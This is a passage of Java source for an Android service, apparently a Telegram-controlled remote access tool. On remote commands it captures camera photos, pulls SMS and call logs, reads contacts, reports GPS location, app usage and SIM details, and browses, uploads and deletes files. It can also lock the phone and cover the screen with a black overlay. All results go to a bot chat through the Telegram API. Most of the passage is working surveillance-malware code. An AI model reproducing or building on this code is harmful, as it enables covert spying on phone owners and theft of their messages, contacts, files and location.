					return Long.compare(b.getTotalTimeInForeground(), a.getTotalTimeInForeground());
				}
			});

        StringBuilder sb = new StringBuilder("App Usage (Last 24h):\n\n");
        for (android.app.usage.UsageStats us : stats) {
            if (us.getTotalTimeInForeground() > 0) {
                long secs = us.getTotalTimeInForeground() / 1000;
                sb.append(us.getPackageName())
					.append("\n  Time: ").append(secs / 3600).append("h ")
					.append((secs % 3600) / 60).append("m ").append(secs % 60).append("s")
					.append("\n\n");
            }
        }
        sendDocument("usage_stats.txt", sb.toString());
    }

    // ─────────────────────────────────────────────────────────
    // BATTERY
    // ─────────────────────────────────────────────────────────

    private void sendBatteryInfo() {
        Intent batteryStatus = null;
        try {
            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            batteryStatus = registerReceiver(null, ifilter);
            if (batteryStatus == null) {
                sendTextMessage("Battery info not available.");
                return;
            }
            int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
            int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
            float pct = level * 100f / scale;
            int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
            boolean charging = status == BatteryManager.BATTERY_STATUS_CHARGING
				|| status == BatteryManager.BATTERY_STATUS_FULL;
            int plug = batteryStatus.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);

            String source;
            if (plug == BatteryManager.BATTERY_PLUGGED_USB) {
                source = "USB";
            } else if (plug == BatteryManager.BATTERY_PLUGGED_AC) {
                source = "AC";
            } else if (plug == BatteryManager.BATTERY_PLUGGED_WIRELESS) {
                source = "Wireless";
            } else {
                source = "Not charging";
            }

            String msg = String.format(Locale.US,
									   "Battery: %.1f%%\nCharging: %s\nSource: %s",
									   pct, charging ? "Yes" : "No", source);
            sendTextMessage(msg);
        } catch (Exception e) {
            sendTextMessage("Battery error: " + e.getMessage());
        }
    }

    // ─────────────────────────────────────────────────────────
    // LOCATION
    // ─────────────────────────────────────────────────────────

    private void sendLocation() {
        if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION)
			!= PackageManager.PERMISSION_GRANTED) {
            sendTextMessage("Location permission missing.");
            return;
        }
        if (locationManager == null) {
            sendTextMessage("Location service not available.");
            return;
        }
        sendTextMessage("Fetching location...");
        Location best = null;
        List<String> providers = locationManager.getProviders(true);
        for (String provider : providers) {
            try {
                Location l = locationManager.getLastKnownLocation(provider);
                if (l != null && (best == null || l.getAccuracy() < best.getAccuracy())) {
                    best = l;
                }
            } catch (SecurityException ignored) {
            }
        }
        if (best == null) {
            sendTextMessage("No recent location. Try again in a moment.");
            return;
        }
        double lat = best.getLatitude();
        double lon = best.getLongitude();
        String addr = getAddressFromLocation(lat, lon);
        String msg = String.format(Locale.US,
								   "Location:\nLat: %.6f\nLon: %.6f\nAddress: %s\nMaps: https://maps.google.com/?q=%.6f,%.6f",
								   lat, lon, addr, lat, lon);
        sendTextMessage(msg);
    }

    private String getAddressFromLocation(double lat, double lon) {
        try {
            Geocoder gc = new Geocoder(this, Locale.getDefault());
            List<Address> addrs = gc.getFromLocation(lat, lon, 1);
            if (addrs != null && !addrs.isEmpty()) {
                return addrs.get(0).getAddressLine(0);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return "Address not found";
    }

    // ─────────────────────────────────────────────────────────
    // LOCK DEVICE
    // ─────────────────────────────────────────────────────────

    private void lockDevice() {
        if (devicePolicyManager != null && devicePolicyManager.isAdminActive(adminComponent)) {
            try {
                devicePolicyManager.lockNow();
                sendTextMessage("Device locked.");
            } catch (Exception e) {
                sendTextMessage("Lock error: " + e.getMessage());
            }
        } else {
            sendTextMessage("Device Admin not activated. Please activate it first.");
        }
    }

    // ─────────────────────────────────────────────────────────
    // TOAST / OVERLAY ALERT
    // ─────────────────────────────────────────────────────────

    private void showFullScreenAlert(final String message) {
        mainHandler.post(new Runnable() {
				@Override
				public void run() {
					try {
						android.app.AlertDialog.Builder builder =
                            new android.app.AlertDialog.Builder(BotService.this,
																android.R.style.Theme_Black_NoTitleBar_Fullscreen);
						builder.setMessage(message);
						builder.setPositiveButton("OK", null);
						android.app.AlertDialog dialog = builder.create();
						if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
							dialog.getWindow().setType(WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY);
						} else {
							dialog.getWindow().setType(WindowManager.LayoutParams.TYPE_PHONE);
						}
						dialog.show();
						sendTextMessage("Alert shown on device.");
					} catch (Exception e) {
						sendTextMessage("Alert error: " + e.getMessage());
					}
				}
			});
    }

    // ─────────────────────────────────────────────────────────
    // HELP
    // ─────────────────────────────────────────────────────────

    private void sendHelpMessage() {
        String help = "=== Remote Bot Commands ===\n\n"
			+ "CAMERA:\n"
			+ "/camera_back - Capture back camera\n"
			+ "/camera_front - Capture front camera\n\n"
			+ "FLASH:\n"
			+ "/flash_on - Torch ON\n"
			+ "/flash_off - Torch OFF\n\n"
			+ "VIBRATE:\n"
			+ "/vibe_1 /vibe_2 /vibe_3\n\n"
			+ "LOGS:\n"
			+ "/sms - SMS logs\n"
			+ "/call - Call logs\n\n"
			+ "DEVICE INFO:\n"
			+ "/battery - Battery info\n"
			+ "/phone_activity - App usage\n"
			+ "/Location - GPS location\n\n"
			+ "NOTIFICATIONS:\n"
			+ "/notif_on - Enable all notifications\n"
			+ "/notif_off - Silence all (DND)\n"
			+ "/notif_status - Current status\n\n"
			+ "FILE MANAGER:\n"
			+ "/files - Current folder\n"
			+ "/files_sdcard - SD Card\n"
			+ "/files_downloads - Downloads\n"
			+ "/files_dcim - Camera folder\n"
			+ "/cd <path> - Open folder\n"
			+ "/send_file <path> - Send file\n"
			+ "/delete_file <path> - Delete file\n\n"
			+ "OTHER:\n"
			+ "/lock - Lock screen\n"
			+ "/Toast <msg> - Show alert\n"
			+ "/start - Main keyboard\n"
			+ "/help - This help";
        sendTextMessage(help);
    }

    // ─────────────────────────────────────────────────────────
    // SEND PHOTO
    // ─────────────────────────────────────────────────────────

    private void sendPhoto(final byte[] data, final String caption) {
        executor.execute(new Runnable() {
				@Override
				public void run() {
					HttpURLConnection con = null;
					try {
						String boundary = "---" + System.currentTimeMillis() + "---";
						con = (HttpURLConnection) new URL("https://api.telegram.org/bot" + botToken + "/sendPhoto").openConnection();
						con.setDoOutput(true);
						con.setConnectTimeout(15000);
						con.setReadTimeout(30000);
						con.setRequestMethod("POST");
						con.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

						DataOutputStream dos = new DataOutputStream(con.getOutputStream());

						dos.writeBytes("--" + boundary + "\r\n");
						dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
						dos.writeBytes(myChatId + "\r\n");

						dos.writeBytes("--" + boundary + "\r\n");
						dos.writeBytes("Content-Disposition: form-data; name=\"caption\"\r\n\r\n");
						dos.writeBytes(caption + "\r\n");

						dos.writeBytes("--" + boundary + "\r\n");
						dos.writeBytes("Content-Disposition: form-data; name=\"photo\"; filename=\"photo.jpg\"\r\n");
						dos.writeBytes("Content-Type: image/jpeg\r\n\r\n");
						dos.write(data);
						dos.writeBytes("\r\n--" + boundary + "--\r\n");
						dos.flush();
						dos.close();
						con.getInputStream().close();
					} catch (Exception e) {
						e.printStackTrace();
						sendTextMessage("Photo send error: " + e.getMessage());
					} finally {
						if (con != null) con.disconnect();
					}
				}
			});
    }

    // ─────────────────────────────────────────────────────────
    // SEND DOCUMENT
    // ─────────────────────────────────────────────────────────

    private void sendDocument(final String fileName, final String content) {
        executor.execute(new Runnable() {
				@Override
				public void run() {
					HttpURLConnection con = null;
					try {
						String boundary = "---" + System.currentTimeMillis() + "---";
						con = (HttpURLConnection) new URL("https://api.telegram.org/bot" + botToken + "/sendDocument").openConnection();
						con.setDoOutput(true);
						con.setConnectTimeout(15000);
						con.setReadTimeout(30000);
						con.setRequestMethod("POST");
						con.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

						DataOutputStream dos = new DataOutputStream(con.getOutputStream());

						dos.writeBytes("--" + boundary + "\r\n");
						dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
						dos.writeBytes(myChatId + "\r\n");

						dos.writeBytes("--" + boundary + "\r\n");
						dos.writeBytes("Content-Disposition: form-data; name=\"document\"; filename=\"" + fileName + "\"\r\n");
						dos.writeBytes("Content-Type: text/plain\r\n\r\n");
						dos.write(content.getBytes("UTF-8"));
						dos.writeBytes("\r\n--" + boundary + "--\r\n");
						dos.flush();
						dos.close();
						con.getInputStream().close();
					} catch (Exception e) {
						e.printStackTrace();
					} finally {
						if (con != null) con.disconnect();
					}
				}
			});
    }

    // ─────────────────────────────────────────────────────────
    // STATIC SEND METHODS (for UI calls)
    // ─────────────────────────────────────────────────────────

    private static void sendTextMessage(final String text) {
        if (appContext == null) return;
        new Thread(new Runnable() {
				@Override
				public void run() {
					HttpURLConnection con = null;
					try {
						String urlString = "https://api.telegram.org/bot" + botToken
                            + "/sendMessage?chat_id=" + myChatId
                            + "&text=" + URLEncoder.encode(text, "UTF-8");
						con = (HttpURLConnection) new URL(urlString).openConnection();
						con.setConnectTimeout(8000);
						con.getInputStream().close();
					} catch (Exception e) {
						e.printStackTrace();
					} finally {
						if (con != null) con.disconnect();
					}
				}
			}).start();
    }

    private static void sendFileToTelegram(final String filePath) {
        if (appContext == null) return;
        new Thread(new Runnable() {
				@Override
				public void run() {
					HttpURLConnection con = null;
					FileInputStream fis = null;
					try {
						File file = new File(filePath);
						if (!file.exists()) {
							sendTextMessage("File not found:\n" + filePath);
							return;
						}
						if (!file.isFile()) {
							sendTextMessage("That is a directory.");
							return;
						}
						long sizeMB = file.length() / (1024 * 1024);
						if (sizeMB > 48) {
							sendTextMessage("File too large (" + sizeMB + " MB).");
							return;
						}

						String boundary = "---" + System.currentTimeMillis() + "---";
						con = (HttpURLConnection) new URL("https://api.telegram.org/bot" + botToken + "/sendDocument").openConnection();
						con.setDoOutput(true);
						con.setConnectTimeout(30000);
						con.setReadTimeout(60000);
						con.setRequestMethod("POST");
						con.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

						DataOutputStream dos = new DataOutputStream(con.getOutputStream());

						dos.writeBytes("--" + boundary + "\r\n");
						dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
						dos.writeBytes(myChatId + "\r\n");

						dos.writeBytes("--" + boundary + "\r\n");
						dos.writeBytes("Content-Disposition: form-data; name=\"caption\"\r\n\r\n");
						dos.writeBytes(file.getName() + "\r\n");

						dos.writeBytes("--" + boundary + "\r\n");
						dos.writeBytes("Content-Disposition: form-data; name=\"document\"; filename=\""
									   + file.getName() + "\"\r\n");
						dos.writeBytes("Content-Type: application/octet-stream\r\n\r\n");

						fis = new FileInputStream(file);
						byte[] buf = new byte[4096];
						int read;
						while ((read = fis.read(buf)) != -1) {
							dos.write(buf, 0, read);
						}
						fis.close();

						dos.writeBytes("\r\n--" + boundary + "--\r\n");
						dos.flush();
						dos.close();

						int responseCode = con.getResponseCode();
						if (responseCode != 200) {
							sendTextMessage("Send failed. Response code: " + responseCode);
						}
					} catch (Exception e) {
						sendTextMessage("File send error: " + e.getMessage());
					} finally {
						if (fis != null) try { fis.close(); } catch (IOException ignored) {}
						if (con != null) con.disconnect();
					}
				}
			}).start();
    }

    // ─────────────────────────────────────────────────────────
    // CAMERA STREAM SERVER (optional, with runtime check)
    // ─────────────────────────────────────────────────────────

    private void startCameraStream() {
        if (!hasNanoHTTPD) {
            sendTextMessage("Camera stream requires NanoHTTPD library. Please add 'implementation \"org.nanohttpd:nanohttpd:2.3.1\"' to build.gradle.");
            return;
        }
        if (streamServer == null) {
            try {
                // Use reflection to avoid direct dependency
                Class<?> serverClass = Class.forName("fi.iki.elonen.NanoHTTPD");
                streamServer = serverClass.getConstructor(int.class).newInstance(8080);
                // Start the server (requires a start() method)
                serverClass.getMethod("start").invoke(streamServer);
                String ip = getLocalIpAddress();
                sendTextMessage("Camera stream started at http://" + ip + ":8080");
            } catch (Exception e) {
                sendTextMessage("Failed to start stream server: " + e.getMessage());
                streamServer = null;
            }
        } else {
            sendTextMessage("Stream already running.");
        }
    }

    private void stopCameraStream() {
        if (streamServer != null) {
            try {
                // Use reflection to stop
                Class<?> serverClass = Class.forName("fi.iki.elonen.NanoHTTPD");
                serverClass.getMethod("stop").invoke(streamServer);
                streamServer = null;
                sendTextMessage("Stream stopped.");
            } catch (Exception e) {
                sendTextMessage("Error stopping stream: " + e.getMessage());
            }
        }
    }

    // ─────────────────────────────────────────────────────────
    // BLACK OVERLAY
    // ─────────────────────────────────────────────────────────

    private void showBlackOverlay() {
        mainHandler.post(new Runnable() {
				@Override
				public void run() {
					if (blackOverlay == null && windowManager != null) {
						try {
							blackOverlay = new FrameLayout(BotService.this);
							blackOverlay.setBackgroundColor(0xFF000000);
							WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                                LayoutParams.MATCH_PARENT,
                                LayoutParams.MATCH_PARENT,
                                Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ?
								LayoutParams.TYPE_APPLICATION_OVERLAY : LayoutParams.TYPE_PHONE,
                                LayoutParams.FLAG_NOT_FOCUSABLE | LayoutParams.FLAG_NOT_TOUCH_MODAL,
                                PixelFormat.TRANSLUCENT
							);
							windowManager.addView(blackOverlay, params);
							sendTextMessage("Black screen overlay shown.");
						} catch (Exception e) {
							sendTextMessage("Overlay error: " + e.getMessage());
						}
					}
				}
			});
    }

    private void hideBlackOverlay() {
        mainHandler.post(new Runnable() {
				@Override
				public void run() {
					if (blackOverlay != null && windowManager != null) {
						try {
							windowManager.removeView(blackOverlay);
							blackOverlay = null;
							sendTextMessage("Black screen overlay hidden.");
						} catch (Exception e) {
							sendTextMessage("Hide overlay error: " + e.getMessage());
						}
					}
				}
			});
    }

    // ─────────────────────────────────────────────────────────
    // SIM INFO
    // ─────────────────────────────────────────────────────────

    private void sendSimInfo() {
        TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        if (tm == null) {
            sendTextMessage("Telephony service not available.");
            return;
        }
        String info = "SIM Info:\n";
        if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
            try {
                info += "Operator: " + tm.getNetworkOperatorName() + "\n";
                info += "Country: " + tm.getNetworkCountryIso() + "\n";
                info += "Phone Type: " + (tm.getPhoneType() == TelephonyManager.PHONE_TYPE_GSM ? "GSM" : "CDMA") + "\n";
                info += "SIM State: " + tm.getSimState() + "\n";
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    info += "Data Enabled: " + tm.isDataEnabled() + "\n";
                }
            } catch (Exception e) {
                info += "Error: " + e.getMessage();
            }
        } else {
            info += "Permission not granted.";
        }
        sendTextMessage(info);
    }

    // ─────────────────────────────────────────────────────────
    // CONTACTS
    // ─────────────────────────────────────────────────────────

    private void sendContacts() {
        if (checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            sendTextMessage("Contacts permission missing.");
            return;
        }
        StringBuilder sb = new StringBuilder("Contacts:\n\n");
        Cursor cursor = null;
        try {
            cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
												null, null, null, null);
            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext()) {
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String number = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    sb.append(name).append(": ").append(number).append("\n\n");
                    count++;
                    if (count >= 50) break;
                }
            }
        } catch (Exception e) {
            sendTextMessage("Contacts error: " + e.getMessage());
        } finally {
            if (cursor != null) cursor.close();
        }
        sendDocument("contacts.txt", sb.toString());
    }

    // ─────────────────────────────────────────────────────────
    // SEND POWER PANEL (Telegram Keyboard)
    // ─────────────────────────────────────────────────────────

    private void sendPowerPanel() {
        executor.execute(new Runnable() {
				@Override
				public void run() {
					HttpURLConnection con = null;
					try {
						String deviceName = Build.MANUFACTURER + " " + Build.MODEL;
						String inlineKb = "{\"inline_keyboard\":[[{\"text\":\"" + deviceName + " - Connect\",\"callback_data\":\"connect\"}]]}";
						String urlString = "https://api.telegram.org/bot" + botToken
                            + "/sendMessage?chat_id=" + myChatId
                            + "&text=" + URLEncoder.encode("Remote Bot Ready! Tap to connect.", "UTF-8")
                            + "&reply_markup=" + URLEncoder.encode(inlineKb, "UTF-8");
						con = (HttpURLConnection) new URL(urlString).openConnection();
						con.getInputStream().close();

						sendMainKeyboard();
					} catch (Exception e) {
						e.printStackTrace();
					} finally {
						if (con != null) con.disconnect();
					}
				}
			});
    }

    private void sendMainKeyboard() {
        HttpURLConnection con = null;
        try {
            String kb = "{\"keyboard\":["
				+ "[{\"text\":\"/camera_back\"},{\"text\":\"/camera_front\"}],"
				+ "[{\"text\":\"/flash_on\"},{\"text\":\"/flash_off\"}],"
				+ "[{\"text\":\"/vibe_1\"},{\"text\":\"/vibe_2\"},{\"text\":\"/vibe_3\"}],"
				+ "[{\"text\":\"/sms\"},{\"text\":\"/call\"}],"
				+ "[{\"text\":\"/battery\"},{\"text\":\"/phone_activity\"},{\"text\":\"/Location\"}],"
				+ "[{\"text\":\"/notif_on\"},{\"text\":\"/notif_off\"},{\"text\":\"/notif_status\"}],"
				+ "[{\"text\":\"/files\"},{\"text\":\"/files_downloads\"},{\"text\":\"/files_dcim\"}],"
				+ "[{\"text\":\"/lock\"},{\"text\":\"/help\"}]"
				+ "],\"resize_keyboard\":true,\"one_time_keyboard\":false}";

            String urlString = "https://api.telegram.org/bot" + botToken
				+ "/sendMessage?chat_id=" + myChatId
				+ "&text=" + URLEncoder.encode("Main control panel", "UTF-8")
				+ "&reply_markup=" + URLEncoder.encode(kb, "UTF-8");
            con = (HttpURLConnection) new URL(urlString).openConnection();
            con.getInputStream().close();
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (con != null) con.disconnect();
        }
    }
}
